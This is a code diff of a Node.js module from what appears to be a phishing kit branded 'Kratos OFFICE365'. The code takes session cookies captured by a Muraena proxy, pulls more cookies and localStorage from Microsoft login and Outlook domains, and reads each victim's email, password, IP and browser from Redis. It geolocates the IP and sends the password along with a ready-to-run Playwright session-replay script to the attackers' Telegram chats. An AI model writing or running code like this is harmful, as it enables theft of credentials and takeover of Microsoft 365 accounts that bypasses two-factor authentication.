@@ -95,7 +95,7 @@ exports.AddAuthenticatorApp = async ({ page, data: [taskId, cookies, params] }) 
 exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
     await db.UpdateTaskStatus(taskId, "running")
 
-    // 1. Inject muraena-captured cookies and let MSAL complete silently on fixSession
+    // 1. Inject muraena cookies — let MSAL complete silently on fixSession
     await page.setCookie(...cookies)
     try {
         await page.goto(params.fixSession, { waitUntil: 'networkidle2', timeout: 35000 })
@@ -104,56 +104,108 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
     }
     await necrohelp.Sleep(3000)
 
-    // 2. Collect combined cookie set from ALL Microsoft domains
+    // 2. Collect cookies from all MS domains (main page stays where it is)
     const MS_DOMAINS = [
-        'https://login.microsoftonline.com',
-        'https://login.live.com',
-        'https://outlook.office.com',
-        'https://outlook.office365.com',
-        'https://outlook.cloud.microsoft',
-        'https://www.office.com',
-        'https://m365.cloud.microsoft',
-        'https://substrate.office.com',
+        'https://login.microsoftonline.com', 'https://login.live.com',
+        'https://outlook.office.com', 'https://outlook.office365.com',
+        'https://outlook.cloud.microsoft', 'https://www.office.com',
+        'https://m365.cloud.microsoft', 'https://substrate.office.com',
     ]
     let allCookies = []
     try {
         allCookies = await page.cookies(...MS_DOMAINS)
-    } catch(e) {
-        console.log(`[${taskId}] multi-domain cookies failed: ${e.message}`)
-        allCookies = await page.cookies()
-    }
-    console.log(`[${taskId}] collected ${allCookies.length} cookies (muraena+MSAL combined)`)
+    } catch(e) { allCookies = await page.cookies() }
+    console.log(`[${taskId}] collected ${allCookies.length} cookies`)
 
-    // 3. Look up victim email from Redis (task name = victim UUID from %%%TRACKER%%%)
-    let victimEmail = null
-    let victimUUID = null
+    // 3. Extract localStorage via SEPARATE pages — main page never navigates away.
+    //    All pages in the same browser context share localStorage per-origin.
+    const LS_ORIGINS = [
+        'https://login.microsoftonline.com',
+        'https://www.office.com',
+        'https://m365.cloud.microsoft',
+        'https://outlook.office.com',
+        'https://outlook.cloud.microsoft',
+    ]
+    const originStorages = []
+    const browser = page.browser()
+    for (const origin of LS_ORIGINS) {
+        let lsPage = null
+        try {
+            lsPage = await browser.newPage()
+            await lsPage.goto(origin, { waitUntil: 'domcontentloaded', timeout: 12000 })
+            const items = await lsPage.evaluate(() => {
+                const d = {}
+                for (let i = 0; i < localStorage.length; i++) {
+                    const k = localStorage.key(i)
+                    d[k] = localStorage.getItem(k)
+                }
+                return d
+            })
+            const entries = Object.entries(items).map(([name, value]) => ({ name, value }))
+            if (entries.length > 0) {
+                originStorages.push({ origin, localStorage: entries })
+                console.log(`[${taskId}] localStorage ${origin}: ${entries.length} items`)
+            }
+        } catch(e) {
+            console.log(`[${taskId}] localStorage ${origin}: ${e.message}`)
+        } finally {
+            if (lsPage) try { await lsPage.close() } catch(e) {}
+        }
+    }
+    console.log(`[${taskId}] localStorage origins: ${originStorages.length}`)
+
+    // 4. Victim details from Redis: email, password, IP, UA
+    let victimEmail = null, victimPass = null, victimIP = null, victimUA = null, victimUUID = null
     try {
         const { createClient: _rc1 } = require('redis')
         const rc1 = _rc1({ url: process.env.REDIS_URL || 'redis://redis:6379' })
         await rc1.connect()
         try {
             victimUUID = await rc1.hGet(taskId, 'name')
-            console.log(`[${taskId}] victimUUID: ${victimUUID}`)
             if (victimUUID) {
+                const vh = await rc1.hGetAll(`victim:${victimUUID}`)
+                victimIP = vh.ip || null
+                victimUA = vh.ua || null
                 const credKeys = await rc1.keys(`victim:${victimUUID}:creds:*`)
                 for (const k of credKeys) {
                     const cred = await rc1.hGetAll(k)
                     const kl = (cred.key || '').toLowerCase()
-                    if (['loginfmt', 'username', 'email', 'login'].includes(kl)) {
-                        victimEmail = cred.val
-                        break
-                    }
+                    if (!victimEmail && ['loginfmt','username','email','login'].includes(kl)) victimEmail = cred.val
+                    if (!victimPass && ['passwd','password'].includes(kl)) victimPass = cred.val
+                    if (victimEmail && victimPass) break
                 }
             }
         } finally { await rc1.quit() }
-    } catch(e) { console.log(`[${taskId}] email lookup: ${e.message}`) }
+    } catch(e) { console.log(`[${taskId}] Redis: ${e.message}`) }
 
     const label = victimEmail || taskId
     let finalUrl = 'unknown'; try { finalUrl = page.url() } catch(e) {}
-    console.log(`[${taskId}] label=${label}  finalUrl=${finalUrl.substring(0,80)}`)
+    console.log(`[${taskId}] label=${label} pass=${victimPass?'***':'none'} ip=${victimIP} finalUrl=${finalUrl.substring(0,60)}`)
+
+    // 5. GeoIP
+    let geoCity = 'Unknown', geoCountry = ''
+    if (victimIP) {
+        try {
+            const geo = await new Promise((res, rej) => {
+                require('http').get(`http://ip-api.com/json/${victimIP}?fields=city,country`, r => {
+                    let d = ''; r.on('data', c => d += c); r.on('end', () => res(JSON.parse(d)))
+                }).on('error', rej)
+            })
+            geoCity = geo.city || 'Unknown'; geoCountry = geo.country || ''
+        } catch(e) { console.log(`[${taskId}] GeoIP: ${e.message}`) }
+    }
+    const location = [geoCity, geoCountry].filter(Boolean).join(' - ')
+
+    // 6. Browser + account type
+    const ua = victimUA || ''
+    const browserName = ua.includes('Edg/') ? 'Edge' : ua.includes('Chrome/') ? 'Chrome'
+        : ua.includes('Firefox/') ? 'Firefox' : ua.includes('Safari/') ? 'Safari' : 'Unknown'
+    const personalDomains = ['gmail.com','yahoo.com','hotmail.com','outlook.com','live.com','icloud.com','aol.com']
+    const accType = personalDomains.includes(((victimEmail||'').split('@')[1]||'').toLowerCase()) ? 'personal' : 'business'
+    const dateStr = new Date().toLocaleString('en-US',{weekday:'short',year:'numeric',month:'short',day:'2-digit',hour:'2-digit',minute:'2-digit'})
 
     if (params.telegramToken && params.telegramChatId) {
-        // 4. SETNX dedup — one delivery per victim email per 24 h
+        // 7. Dedup
         let alreadySent = false
         if (victimEmail) {
             try {
@@ -164,7 +216,7 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
                 alreadySent = (nx === null)
                 await rc2.quit()
                 if (alreadySent) console.log(`[${taskId}] dedup: already sent for ${victimEmail}`)
-            } catch(e) { console.log(`[${taskId}] dedup err: ${e.message}`) }
+            } catch(e) { console.log(`[${taskId}] dedup: ${e.message}`) }
         }
 
         if (!alreadySent) {
@@ -173,52 +225,45 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
                 const bot = new TelegramBot(params.telegramToken, { polling: false })
                 const chatIds = Array.isArray(params.telegramChatId) ? params.telegramChatId : [params.telegramChatId]
 
-                // Build cookie array preserving all fields
+                // Build storageState
                 const cookieArr = allCookies.map(c => ({
                     Name: c.name, Value: c.value, Domain: c.domain,
-                    Path: c.path || '/', Secure: c.secure || false,
-                    HttpOnly: c.httpOnly || false, SameSite: c.sameSite || 'None',
-                    Expires: c.expires || 0
+                    Path: c.path||'/', Secure: c.secure||false,
+                    HttpOnly: c.httpOnly||false, SameSite: c.sameSite||'None', Expires: c.expires||0
                 }))
+                const storageState = { cookies: cookieArr, origins: originStorages }
+                const b64 = Buffer.from(JSON.stringify(storageState)).toString('base64')
+                const safeLabel = label.replace(/[@.]/g,'_').replace(/[^a-zA-Z0-9_]/g,'')
 
-                // Base64 encode the JSON payload
-                const b64 = Buffer.from(JSON.stringify(cookieArr)).toString('base64')
-
-                // Deliver as a Playwright Python script — context.add_cookies() sets
-                // cookies at the CDP level, so HttpOnly (ESTSAUTHPERSISTENT) is correctly
-                // set. Run: pip install playwright && playwright install chromium && python3 <file>
-                const script = [
+                const pyScript = [
                     '#!/usr/bin/env python3',
-                    '# KRATOS OFFICE365',
+                    '# KRATOS OFFICE365 — ' + label,
                     '# pip install playwright && playwright install chromium',
-                    '# python3 ' + label.replace(/[@.]/g, '_').replace(/[^a-zA-Z0-9_]/g, '') + '.py',
+                    '# python3 ' + safeLabel + '.py',
                     'import asyncio, json, base64',
                     'from playwright.async_api import async_playwright',
                     '',
-                    'COOKIES_B64 = "' + b64 + '"',
+                    'STATE_B64 = "' + b64 + '"',
                     '',
                     'async def main():',
+                    '    state = json.loads(base64.b64decode(STATE_B64).decode("utf-8"))',
+                    '    for c in state["cookies"]:',
+                    '        c["name"]     = c.pop("Name")',
+                    '        c["value"]    = c.pop("Value")',
+                    '        c["domain"]   = c.pop("Domain")',
+                    '        c["path"]     = c.pop("Path", "/")',
+                    '        c["secure"]   = c.pop("Secure", False)',
+                    '        c["httpOnly"] = c.pop("HttpOnly", False)',
+                    '        ss = c.pop("SameSite", "None")',
+                    '        c["sameSite"] = ss.capitalize() if ss else "None"',
+                    '        exp = c.pop("Expires", 0)',
+                    '        if exp and exp > 0: c["expires"] = float(exp)',
                     '    async with async_playwright() as p:',
                     '        browser = await p.chromium.launch(headless=False)',
-                    '        context = await browser.new_context()',
-                    '        raw = json.loads(base64.b64decode(COOKIES_B64))',
-                    '        cookies = []',
-                    '        for c in raw:',
-                    '            ck = {',
-                    '                "name": c["Name"], "value": c["Value"],',
-                    '                "domain": c["Domain"], "path": c.get("Path", "/"),',
-                    '                "secure": c.get("Secure", False),',
-                    '                "http_only": c.get("HttpOnly", False),',
-                    '                "same_site": c.get("SameSite", "None"),',
-                    '            }',
-                    '            if c.get("Expires", 0) > 0:',
-                    '                ck["expires"] = float(c["Expires"])',
-                    '            cookies.append(ck)',
-                    '        await context.add_cookies(cookies)',
+                    '        context = await browser.new_context(storage_state=state)',
                     '        page = await context.new_page()',
                     '        await page.goto("https://outlook.office.com/mail/", wait_until="domcontentloaded")',
                     '        await page.wait_for_timeout(5000)',
-                    '        await page.screenshot(path="inbox.png")',
                     '        print("URL:", page.url)',
                     '        input("Press Enter to close...")',
                     '        await browser.close()',
@@ -226,13 +271,27 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
                     'asyncio.run(main())'
                 ].join('\n')
 
-                const caption = `[Kratos]- OFFICE VALID [ ${label} ] ❤️`
-                const safeLabel = label.replace(/[@.]/g, '_').replace(/[^a-zA-Z0-9_]/g, '')
-                const filename = `${safeLabel}.py`
+                const infoMsg = [
+                    `[Kratos]- OFFICE VALID [ ${label} ] ❤️`,
+                    `⚡ Email: ${label}`,
+                    `⚡ Password: ${victimPass || 'N/A'}`,
+                    `⚡ Type: ${accType}`,
+                    `⚡ 2FA Security: Completed ✅`,
+                    `⚡ Role: No`,
+                    `⚡ Edu: No`,
+                    `——[IP INFORMATION]——`,
+                    `IP: ${victimIP || 'Unknown'}`,
+                    `Browser: ${browserName}`,
+                    `Location: ${location}`,
+                    `Date: ${dateStr}`,
+                    `GOD-OF-WAR!`
+                ].join('\n')
 
+                const filename = `${safeLabel}.py`
                 for (const chatId of chatIds) {
-                    await bot.sendDocument(chatId, Buffer.from(script), { caption }, { filename, contentType: 'text/x-python' })
-                    console.log(`[${taskId}] sent ${allCookies.length} cookies to Telegram ${chatId} as ${filename}`)
+                    await bot.sendMessage(chatId, infoMsg)
+                    await bot.sendDocument(chatId, Buffer.from(pyScript), {}, { filename, contentType: 'text/x-python' })
+                    console.log(`[${taskId}] delivered to ${chatId}: ${filename} cookies=${allCookies.length} ls=${originStorages.length}`)
                 }
             } catch(e) { console.log(`[${taskId}] Telegram error: ${e.message}`) }
         }
